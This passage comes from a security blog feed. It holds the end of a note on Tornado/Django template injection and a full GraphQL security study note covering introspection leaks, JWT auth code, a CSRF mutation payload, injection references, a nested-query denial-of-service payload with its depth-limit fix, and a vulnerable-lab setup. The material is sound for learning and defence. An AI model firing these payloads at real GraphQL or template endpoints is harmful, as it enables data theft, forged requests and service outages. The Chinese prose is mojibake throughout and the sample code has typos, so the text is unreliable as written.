&lt;p>Tornadoä¹Ÿæ˜¯ä¸€ç§æ¨¡æ¿ï¼Œå¯ä»¥æ‰§è¡Œç®€å•çš„è¡¨è¾¾å¼å’Œä¼ é€’å˜é‡ï¼Œå½“å‚æ•°å¯æŽ§æ—¶å¯èƒ½é€ æˆxsså’Œrce&lt;/p>
&lt;h2 id="å†…ç½®å­—å…¸å¯¹è±¡">å†…ç½®å­—å…¸å¯¹è±¡&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>&lt;code>handler.settings&lt;/code> æŒ‡å‘çš„æ˜¯RequestHandler.application.settings&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">{{handler.settings}}
{{escape(handler.settings[&amp;#34;cookie&amp;#34;])}}
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h1 id="django">Django&lt;/h1>
&lt;p>Djangoæ˜¯ä¸€ä¸ªpythonçš„webæ¡†æž¶ï¼Œç›¸æ¯”flaskæ¯”è¾ƒåºžå¤§ä¸€ç‚¹ç‚¹ï¼›pç‰›çš„è¿™ç¯‡æ–‡ç« -&amp;gt;&lt;a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html">Python æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´žï¼ˆDjangoä¸ºä¾‹ï¼‰&lt;/a>æŒ‡å‡ºäº†ä¸€ç§åˆ©ç”¨æ€è·¯ï¼Œé€šè¿‡Djangoé»˜è®¤çš„adminçš„modelæ¥èŽ·å–settingså¯¹è±¡ï¼Œè¿›è€ŒèŽ·å–æ•°æ®åº“è´¦å·å¯†ç ã€webåŠ å¯†å¯†é’¥ç­‰ä¿¡æ¯&lt;/p>
&lt;hr>
&lt;p>ä¸¤å‘¨ä¹‹å‰åŸºæœ¬æ€»ç»“è¿‡äº†ï¼Œä½†æ˜¯å‰ä¸¤å¤©é‡åˆ°è¦æž„é€ çš„å…·ä½“åœºæ™¯è¿˜æ˜¯æ‰“ä¸ç©¿ï¼ŒäºŽæ˜¯åˆæ‹äº†ä¸€éåˆ©ç”¨çš„æ€è·¯ï¼ŒæŠŠç¬”è®°æ•´ç†å‡ºæ¥äº†&lt;/p>
&lt;p>è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬å­¦ä¸œè¥¿è¦æ‰Žå®žï¼Œæ›´æ‰Žå®žä¸€ç‚¹ï¼Œä¸ç„¶ä¼šå¾ˆè›‹ç–¼&lt;/p></description></item><item><title>GraphQLå­¦ä¹ ç¬”è®°</title><link>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</link><pubDate>Fri, 03 Sep 2021 20:56:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/09/03/graphql-study-notes/</guid><description>&lt;h2 id="graphqlç®€è¿°">GraphQLç®€è¿°&lt;/h2>
&lt;p>GraphQLæ˜¯ä¸€ç§é’ˆå¯¹Graphï¼ˆå›¾çŠ¶æ•°æ®ï¼‰æŸ¥è¯¢å¾ˆæœ‰ä¼˜åŠ¿çš„Query Languageï¼ˆæŸ¥è¯¢è¯­è¨€ï¼‰ï¼Œè€Œæ¶‰åŠåˆ°å­˜å‚¨æ—¶å¯ä»¥é€‰æ‹©NoSQL, SQLæˆ–å…¶å®ƒä»»æ„å­˜å‚¨æ–¹å¼ï¼ˆä¾‹å¦‚æ–‡æœ¬æ–‡ä»¶ã€å­˜å†…å­˜é‡Œç­‰ï¼‰ï¼›è¿™æ˜¯ä¸€é—¨ä¾¿äºŽå‰åŽç«¯äº¤äº’çš„è¯­è¨€ï¼Œè€Œä¸æ˜¯ä¾¿äºŽåŽç«¯å’Œæ•°æ®åº“äº¤äº’çš„è¯­è¨€ã€‚&lt;/p>
&lt;p>åº”ç”¨GraphQLçš„ä¸€ä¸ªå¾ˆé‡è¦çš„å‰ææ˜¯åŽç«¯æ•°æ®å·²ç»ä»¥å›¾çš„ç»“æž„è¿›è¡Œä¿å­˜ï¼Œï¼ˆå¹¶ä¸”ä¸€å®šæƒ…å†µä¸‹å·²ç»è®¾ç½®å¥½åŸºäºŽéšç§çš„è®¿é—®æŽ§åˆ¶ æŽˆæƒä¸Žé‰´æƒï¼Œå¦åˆ™ä¼šç›´æŽ¥è¢«æ”»å‡»è€…æ‰§è¡Œé«˜å±æ“ä½œï¼‰ã€‚æ¯æ¬¡æŸ¥è¯¢æˆ–æ›´æ–°éƒ½æœ‰è‡ªå·±çš„æ ¹èŠ‚ç‚¹ï¼Œå¾—åˆ°çš„æ•°æ®æ˜¯æ ‘çŠ¶ç»“æž„ï¼›å¦‚æžœå¸Œæœ›ä»¥å›¾çš„å½¢å¼å±•ç¤ºåˆ™å‰ç«¯ä¸èƒ½ç®€å•çš„å¯¹å…¶è¿›è¡Œç¼“å­˜ï¼Œé‚£å¿…é¡»ä½¿ç”¨ç›¸åº”çš„å­˜å‚¨æ•°æ®åº“ï¼Œé€šè¿‡é¡¶ç‚¹çš„IDæŠŠä¸åŒèŠ‚ç‚¹ä¹‹é—´çš„æŸäº›è¾¹é‡æ–°è¿žæŽ¥èµ·æ¥ã€‚&lt;/p>
&lt;p>å¹¶ä¸æ˜¯æ‰€æœ‰åœºæ™¯éƒ½éœ€è¦è¿ç§»åˆ°GraphQLï¼Œå¦‚æžœRESTful APIå·²ç»èƒ½æ»¡è¶³éœ€æ±‚çš„è¯ã€‚&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://twitter.com/jlouis666/status/1018140132153667584">GraphQL is basically just sugar for a simply typed lambda calculus.&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;h3 id="å˜æ›´---mutations">å˜æ›´ - Mutations&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">three important things:&lt;/a>&lt;/p>
&lt;p>mutations are just queries in different namespace, but do NOT mix them;&lt;/p>
&lt;p>arguments require Input Objects, not normal Objects;&lt;/p>
&lt;p>use xyzAttributes for anything you want to link, then let your backend sort out how to do the linking(just like any other system we currently use)&lt;/p>
&lt;/blockquote>
&lt;h3 id="å†…çœ---introspection">å†…çœ - introspection&lt;/h3>
&lt;p>GraphQL å…è®¸åœ¨æŸ¥è¯¢çš„ä»»ä½•ä½ç½®è¯·æ±‚ &lt;code>__typename&lt;/code>ï¼Œä¸€ä¸ªå…ƒå­—æ®µ(Meta fields)ï¼Œä»¥èŽ·å¾—é‚£ä¸ªä½ç½®çš„å¯¹è±¡ç±»åž‹åç§°ã€‚&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902180824151.png" alt="image-20210902180824151">&lt;/p>
&lt;p>æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æŸ¥è¯¢ &lt;code>__schema&lt;/code> å­—æ®µæ¥å‘ GraphQL è¯¢é—®å“ªäº›ç±»åž‹æ˜¯å¯ç”¨çš„ï¼Œç±»åž‹æœ‰ä»¥ä¸‹è¿™äº›ï¼š&lt;/p>
&lt;ul>
&lt;li>Query, Character, Human, Episode, Droid - è¿™äº›æ˜¯æˆ‘ä»¬åœ¨ç±»åž‹ç³»ç»Ÿä¸­å®šä¹‰çš„ç±»åž‹ã€‚&lt;/li>
&lt;li>String, Boolean - è¿™äº›æ˜¯å†…å»ºçš„æ ‡é‡ï¼Œç”±ç±»åž‹ç³»ç»Ÿæä¾›ã€‚&lt;/li>
&lt;li>&lt;code>__Schema&lt;/code>, &lt;code>__Type&lt;/code>, &lt;code>__TypeKind&lt;/code>, &lt;code>__Field&lt;/code>, &lt;code>__InputValue&lt;/code>, &lt;code>__EnumValue&lt;/code>, &lt;code>__Directive&lt;/code> - è¿™äº›æœ‰ç€ä¸¤ä¸ªä¸‹åˆ’çº¿çš„ç±»åž‹æ˜¯å†…çœç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ã€‚&lt;/li>
&lt;/ul>
&lt;h2 id="æ•æ„Ÿä¿¡æ¯æ³„éœ²è¶Šæƒ">æ•æ„Ÿä¿¡æ¯æ³„éœ²&amp;amp;è¶Šæƒ&lt;/h2>
&lt;p>è‡ªåŠ¨æ–‡æ¡£ç”Ÿæˆ/è§£æž - &lt;a href="https://github.com/2fd/graphdoc">graphdoc&lt;/a> | &lt;a href="https://github.com/graphql/graphql-playground">graphql-playground&lt;/a> | &lt;a href="https://apis.guru/graphql-voyager/">graphql-voyager&lt;/a> &amp;hellip;&amp;hellip;&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902183558042.png" alt="image-20210902183558042">&lt;/p>
&lt;p>ç”±äºŽå¯¹å¯¹è±¡æˆ–å±žæ€§çš„æƒé™æŽ§åˆ¶ä¸å®Œå–„ï¼Œå¯¼è‡´ä¿¡æ¯æ³„éœ²ï¼Œæ¡ˆä¾‹ï¼š&lt;a href="https://hackerone.com/reports/310946">hackerone ä¸€ç³»åˆ—ä¿¡æ¯æ³„éœ²æ¼æ´ž&lt;/a>&lt;/p>
&lt;p>åœ¨objects.typesä¸­å¯»æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œå¦‚email, password, secretkey, token, licensekey, sessionç­‰ï¼Œå¤šå¤šå…³æ³¨åºŸå¼ƒå­—æ®µï¼ˆdeprecated fields)ã€‚å½“å­—æ®µè¢«åºŸå¼ƒåŽç›´æŽ¥ç”¨&lt;code>__type&lt;/code>åšå†…çœç¡®å®žæŸ¥æ‰¾ä¸åˆ°ï¼Œä½†å½“æŒ‡å®š&lt;code>includeDreprecated: true&lt;/code>æ—¶ï¼Œ&lt;code>__type&lt;/code>ä»ç„¶å¯ä»¥å°†åºŸå¼ƒå­—æ®µæš´éœ²å‡ºæ¥ã€‚&lt;/p>
&lt;h2 id="graphqlçš„è®¤è¯æ–¹å¼">GraphQLçš„è®¤è¯æ–¹å¼&lt;/h2>
&lt;p>GraphQLå¹¶æ²¡æœ‰è§„å®šä»»ä½•èº«ä»½è®¤è¯å’Œæƒé™æŽ§åˆ¶çš„ç›¸å…³å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ›´çµæ´»çš„åœ¨åº”ç”¨ä¸­å®žçŽ°å„ç§ç²’åº¦çš„è®¤è¯å’Œæƒé™ï¼›ä½†æ˜¯ä¹Ÿå¾ˆå®¹æ˜“å†™å‡ºä¸€äº›â€œè£¸å¥”â€çš„æŽ¥å£æˆ–æ— æ•ˆè®¤è¯æ— æ•ˆçš„æŽ¥å£ã€‚&lt;/p>
&lt;h3 id="ç‹¬ç«‹è®¤è¯ç»ˆç«¯-restful">ç‹¬ç«‹è®¤è¯ç»ˆç«¯ (RESTful)&lt;/h3>
&lt;p>é€šç”¨ä¸”å®˜æ–¹æŽ¨èçš„æ–¹å¼ï¼Œå¦‚æžœåŽç«¯æœ¬èº«æ”¯æŒRESTfulæˆ–æœ‰ä¸“é—¨çš„è®¤è¯æœåŠ¡å™¨ï¼Œå¯ä»¥ä¿®æ”¹å°‘é‡ä»£ç å®žçŽ°GraphQLæŽ¥å£çš„è®¤è¯ã€‚&lt;/p>
&lt;p>ä¸¾ä¾‹ï¼šæ·»åŠ jwtè®¤è¯&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902200434456.png" alt="image-20210902200434456">&lt;/p>
&lt;h3 id="åœ¨graphqlå†…è®¤è¯">åœ¨GraphQLå†…è®¤è¯&lt;/h3>
&lt;p>å¦‚æžœGraphQLçš„åŽç«¯æ”¯æŒGraphQLä¸èƒ½æ”¯æŒRESTfulï¼Œæˆ–å…¨éƒ¨è¯·æ±‚éƒ½éœ€è¦ä½¿ç”¨GraphQLï¼Œä¹Ÿå¯ä»¥ç”¨æž„é€ ç›¸å…³çš„Query SchemaæŽ¥å£è¿”å›žtokençš„å½¢å¼ã€‚&lt;/p>
&lt;p>ä¸¾ä¾‹ï¼šæž„é€ loginçš„Query Schemaï¼Œåœ¨è¿”å›žå€¼ä¸­æºå¸¦token&lt;/p>
&lt;pre tabindex="0">&lt;code>type Query{
login(
username: String!
password: String!
): LoginMsg
type LoginMsg{
message: String
token: String
}
}
&lt;/code>&lt;/pre>&lt;p>åœ¨resolverä¸­æä¾›ç™»å½•é€»è¾‘&lt;/p>
&lt;pre tabindex="0">&lt;code>import bcrypt from 'bcrptjs';
import jsonwebtoken from 'jsonwebtoken';
export const login = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const{username, password} = args;
const user = await db.collection('User').findOne({username: username});
if(await bcyrpt.compare(password, user.password)){
return{
message: 'Login success',
token: jsonwebtoken.sign({
user: user,
exp: Math.floor(Date.now() / 1000) + (60 * 60),
}, 'your secret'),
};
}
}
&lt;/code>&lt;/pre>&lt;p>ç™»å½•æˆåŠŸåŽ æˆ‘ä»¬æŠŠtokenè®¾ç½®åœ¨è¯·æ±‚å¤´ä¸­ï¼Œç»§ç»­è¯·æ±‚GraphQLçš„å…¶ä»–æŽ¥å£ï¼Œè¿™æ—¶éœ€è¦å¯¹ApolloServerè¿›è¡Œå¦‚ä¸‹é…ç½®&lt;/p>
&lt;pre tabindex="0">&lt;code>const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
return{
...user,
...ctx,
...app.context
};
},
});
&lt;/code>&lt;/pre>&lt;p>å®žçŽ°getUserå‡½æ•°&lt;/p>
&lt;pre tabindex="0">&lt;code>const getUser = (token) =&amp;gt; {
let user = null;
const parts = token.split(' ');
if(parts.length === 2){
const scheme = parts[0];
const credentials = parts[1];
if(/^Bearer$/i.test(scheme)){
token = credentials;
try{
user = jwt.verify(token, JWT_SECRET);
console.log(user);
}catch(e){
console.log(e);
}
}
}
return user
}
&lt;/code>&lt;/pre>&lt;p>é…ç½®å¥½ApolloServeråŽï¼Œåœ¨resolverä¸­æ ¡éªŒuser&lt;/p>
&lt;pre tabindex="0">&lt;code>import {ApolloError, ForbiddenError, AuthenticationError} from 'apollo-server';
export const blogs = async(_, args, context) =&amp;gt; {
const db = await context.getDb();
const user = context.user;
if(!user){
throw new AuthenticationError('You must be logged in to see blogs');
}
const {blogId} = args;
const cursor = {}ï¼›
if(blogId){
cursor['_id'] = blogId;
}
const blogs = await db
.collection('blogs')
.find(cursor)
.sort({publishedAt: -1})
.toArray();
return blogs;
}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902203603699.png" alt="image-20210902203603699">&lt;/p>
&lt;h2 id="æ›´å¤šå®‰å…¨æ¼æ´ž">æ›´å¤šå®‰å…¨æ¼æ´ž&lt;/h2>
&lt;p>Express-GraphQLï¼š&lt;/p>
&lt;ul>
&lt;li>æ¡†æž¶é»˜è®¤æ— é˜²æŠ¤&lt;/li>
&lt;li>è‡ªå¸¦GraphiQL&lt;/li>
&lt;/ul>
&lt;p>Graphene-Djangoï¼š&lt;/p>
&lt;ul>
&lt;li>ä¾èµ–Djangoçš„å®‰å…¨é…ç½®ï¼ˆSecure As Defaultï¼‰&lt;/li>
&lt;li>è‡ªå¸¦GraphiQL&lt;/li>
&lt;/ul>
&lt;p>GraphQL-PHP&lt;/p>
&lt;ul>
&lt;li>æ— å…³æ¡†æž¶&lt;/li>
&lt;/ul>
&lt;h3 id="express-graphql-endpoint-csrfæ¼æ´ž">Express-GraphQL Endpoint CSRFæ¼æ´ž&lt;/h3>
&lt;pre tabindex="0">&lt;code>{&amp;quot;query&amp;quot;:&amp;quot;mutation {\n editProfile(name:\&amp;quot;hacker\&amp;quot;, age: 5) {\n name\n age\n }\n}&amp;quot;,&amp;quot;variables&amp;quot;:null}
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902205831949.png" alt="image-20210902205831949">&lt;/p>
&lt;p>å°†Content-Typeä¿®æ”¹ä¸ºapplication/x-www-form-urlencodeï¼Œä»å¯æˆåŠŸæ‰§è¡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>query=mutation%20%7B%0A%20%20editProfile(name%3A%22hacker%22%2C%20age%3A%20
5)%20%7B%0A%20%20%20%20name%0A%20%20%20%20age%0A%20%20%7D%0A%7D
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210011480.png" alt="image-20210902210011480">&lt;/p>
&lt;p>ç›´æŽ¥é…åˆburpè‡ªå¸¦çš„Generate CSRD POC&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902210221214.png" alt="image-20210902210221214">&lt;/p>
&lt;h3 id="graphiql-clickjacking-æ¼æ´ž">GraphiQL Clickjacking æ¼æ´ž&lt;/h3>
&lt;p>å‚è§ï¼šhttps://github.com/graphql/graphiql/issues/683&lt;/p>
&lt;p>å¯ä»¥é…åˆburpè‡ªå¸¦çš„Clickbanditè¿›è¡Œæ”»å‡»&lt;/p>
&lt;h3 id="graphql-injection-æ¼æ´ž">GraphQL injection æ¼æ´ž&lt;/h3>
&lt;p>&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">è¿™æ˜¯ä¸€ä¸ªç›¸å½“å…¨çš„payloads&amp;amp;exps&lt;/a> | &lt;a href="https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da">è¿™æ˜¯ä¸€ä¸ªè‡ªçœpayload&lt;/a>&lt;/p>
&lt;p>pç¥žppté‡Œçš„ç¤ºæ„å›¾ç›´æŽ¥æ¬è¿‡æ¥äº†&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211535481.png" alt="image-20210902211535481">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210902211551814.png" alt="image-20210902211551814">&lt;/p>
&lt;p>ä»ç„¶æ˜¯æ‹¼æŽ¥äº†æ¶æ„çš„GraphQLè¯­å¥å¯¼è‡´æ¼æ´žçš„å‘ç”Ÿï¼Œæœ¬è´¨è¿˜æ˜¯å¯¹ç”¨æˆ·è¾“å…¥çš„æŽ§åˆ¶ä¸ä¸¥æ ¼ï¼›åŒç±»çš„æ¼æ´žè¿˜æœ‰xss, rceç­‰ç­‰&lt;/p>
&lt;blockquote>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">æœ‰è¯­æ³•å°±æœ‰è§£æžï¼Œæœ‰è§£æžå°±ä¼šæœ‰ç»“æž„å’Œé¡ºåºï¼Œæœ‰ç»“æž„å’Œé¡ºåºå°±ä¼šæœ‰æ³¨å…¥ã€‚&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>ç”¨â€œå‚æ•°åŒ–æŸ¥è¯¢â€çš„æ–¹å¼æ¥è§£å†³ä¸Šè¿°é—®é¢˜æ—¶ï¼Œè¦ç¡®ä¿åŽç«¯çš„è§£æžå¼•æ“Žæ²¡æœ‰å¤§ç—…&lt;/p>
&lt;h3 id="é€šè¿‡custom-scalarçš„æ³¨å…¥-json">é€šè¿‡Custom Scalarçš„æ³¨å…¥ (JSON)&lt;/h3>
&lt;blockquote>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">NoSQL Injection is entirely possible when using GraphQL, and can creep into your application through the use of &amp;lsquo;custom scalar types&amp;rsquo;&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>â€”â€”â€”â€”æ›´å¤šçš„GraphQLiç›¸å…³é—®é¢˜å¯å‚è§&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumerate-database-schema-via-introspection">è¿™ä¸ªgitä»“åº“&lt;/a>ï¼Œä¸€æœ¬æ»¡è¶³ï¼ˆ&lt;/p>
&lt;h3 id="æ‹’ç»æœåŠ¡">æ‹’ç»æœåŠ¡&lt;/h3>
&lt;p>GraphQLä¸­çš„queryå’Œmutationçš„è¿”å›žç»“æžœéƒ½æ˜¯å¯ä»¥æœ‰åµŒå¥—çš„å¯¹è±¡çš„ï¼Œå¦‚æžœä¸å¯¹åµŒå¥—æ·±åº¦è¿›è¡Œé™åˆ¶ï¼Œæœ‰å¯èƒ½è¢«åˆ©ç”¨ä»Žè€Œè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚&lt;/p>
&lt;p>ä¸€ä¸ªä¸¾ä¾‹ï¼š&lt;/p>
&lt;p>å®šä¹‰äº†Blogå’ŒAuthor:&lt;/p>
&lt;pre tabindex="0">&lt;code>type Blog{
_id: String!
type: BlogType
avatar: String
title: String
content: [String]
author: Author
....
}
type Author{
_id: String!
name: String
blog: [Blog]
}
&lt;/code>&lt;/pre>&lt;p>éƒ½æœ‰å„è‡ªçš„Query:&lt;/p>
&lt;pre tabindex="0">&lt;code>extend type Query{
blogs(
blogId: ID
systemType: String!
): [Blog]
}
extend type Query{
author(
_id: String
): Author
}
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬å¯ä»¥æž„é€ è¿™æ ·çš„æŸ¥è¯¢ï¼Œæ— é™å¥—å¨ƒå¯¼è‡´dos&lt;/p>
&lt;pre tabindex="0">&lt;code>query GetBlogs($blogId: ID, $systemType: String!) {
blogs(blogId: $blogId, systemType: $systemType) {
_id
title
type
content
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
blog {
author {
name
# and so on...
}
}
}
}
}
}
}
}
}
}
}
}
}
title
createdAt
publishedAt
}
}
publishedAt
}
}
&lt;/code>&lt;/pre>&lt;p>è§£å†³è¿™ä¸ªé—®é¢˜æˆ‘ä»¬éœ€è¦åœ¨GraphQLæœåŠ¡å™¨ä¸Šé™åˆ¶æŸ¥è¯¢æ·±åº¦ï¼ŒåŒæ—¶è®¾è®¡GraphQLæŽ¥å£æ—¶å°½é‡é¿å…å‡ºçŽ°æ­¤ç±»é—®é¢˜ï¼Œä»¥Node.jsä¸ºä¾‹ï¼Œgraphql-depth-limitå°±å¯ä»¥è§£å†³è¿™æ ·çš„é—®é¢˜&lt;/p>
&lt;pre tabindex="0">&lt;code>// ...
import depthLimit from 'graphql-depth-limit';
// ...
const server = new ApolloServer({
typeDefs: schemaText,
resolvers: resolverMap,
context: ({ ctx }) =&amp;gt; {
const token = ctx.req.headers.authorization || '';
const user = getUser(token);
console.log('user', user)
return{
...user,
...ctx,
...app.context
};
},
validationRules: [ depthLimit(10) ]
});
// ...
&lt;/code>&lt;/pre>&lt;h3 id="graphene-django-debugæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜">Graphene-Django DEBUGæ¨¡å¼ä¸‹çš„å®‰å…¨é—®é¢˜&lt;/h3>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903201318096.png" alt="image-20210903201318096">&lt;/p>
&lt;h2 id="åœ¨ctfä¸­çš„è¡¨çŽ°">åœ¨CTFä¸­çš„è¡¨çŽ°&lt;/h2>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;p>[corCTF 2021]devme&lt;/p>
&lt;h2 id="ç»“å°¾">ç»“å°¾&lt;/h2>
&lt;p>&lt;a href="https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application">Damn Vulnerable GraphQL Application&lt;/a>-&amp;gt; ä¸€ä¸ªæ¼æ´žå¤çŽ°çš„é¶åœºï¼ŒåŒ…å«äº†ä¸Šé¢æåˆ°å’Œæ²¡æåˆ°çš„GraphQLå­˜åœ¨çš„æ´ž&lt;/p>
&lt;pre tabindex="0">&lt;code>docker pull dolevf/dvga
docker run -d -p 5000:5000 -e WEB_HOST=0.0.0.0 dolevf/dvga
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210903203245165.png" alt="image-20210903203245165">&lt;/p>
&lt;p>å·²ç»æœ‰&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">å†™å¥½çš„wp&lt;/a>äº† ä¸å‘äº’è”ç½‘äº§å‡ºæ¹¿åžƒåœ¾ ä»Žæˆ‘åšèµ·&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æŽ¥ æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://graphql.cn/">ä¸­æ–‡å®˜ç½‘&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://graphqlapp.herokuapp.com/">åœ¨çº¿GraphiQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/zhouyuexie/learn-graphql">learn-graphql&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.zhihu.com/question/264629587">ä»€ä¹ˆæ˜¯ GraphQLï¼Ÿ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.secpulse.com/archives/148242.html">çŽ©è½¬graphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903795407716366">GraphQL ä»Žå…¥é—¨åˆ°å®žè·µ&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://juejin.cn/post/6844903841813495822">ã€CuteJavaScriptã€‘GraphQLçœŸé¦™å…¥é—¨æ•™ç¨‹&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://xzfile.aliyuncs.com/upload/zcon/2018/7_%E6%94%BB%E5%87%BBGraphQL_phithon.pdf">æ”»å‡»GraphQL&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.freebuf.com/articles/web/184040.html">GraphQLå®‰å…¨æŒ‡åŒ—&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.shuzhiduo.com/A/RnJW3BRoJq/">UWP GraphQLæ•°æ®æŸ¥è¯¢çš„å®žçŽ°&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://medium.com/@HurricaneJames/graphql-mutations-fb3ad5ae73c4">GraphQL Mutations&lt;/a>&lt;/p>
&lt;p>&lt;a href="http://www.petecorey.com/blog/2017/06/12/graphql-nosql-injection-through-json-types/">GraphQL NoSQL Injection Through JSON Types&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/">GraphQL Injection&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/WoHEC50u7KACLLafZL5tww">ã€å®‰å…¨è®°å½•ã€‘çŽ©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸Šï¼‰&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://mp.weixin.qq.com/s/mmJrE6uIBC-4ztr5PFZasA">ã€å®‰å…¨è®°å½•ã€‘çŽ©è½¬GraphQL - DVGAé¶åœºï¼ˆä¸‹ï¼‰&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://tsublogs.wordpress.com/2017/08/25/hitb-ctf-singapore-2017-web-512-blog/">[HITB CTF Singapore 2017]Blog&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://godot.win/2017/GraphQl/#SEC-T-2017-Dark-Market">[SECT 2017]Dark Market&lt;/a> | &lt;a href="https://github.com/reznok/CTFWriteUps/tree/master/SEC-T_2017/DarkMarket">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://swisskyrepo.github.io/HIP19-MeetYourDoctor/">[Hack in Paris CTF 2019]Meet Your Doctor 1 2 3&lt;/a> | &lt;a href="https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/">wp2&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.gem-love.com/ctf/2198.html">[VolgaCTF 2020]Library&lt;/a>&lt;/p>
&lt;/details>
&lt;hr>
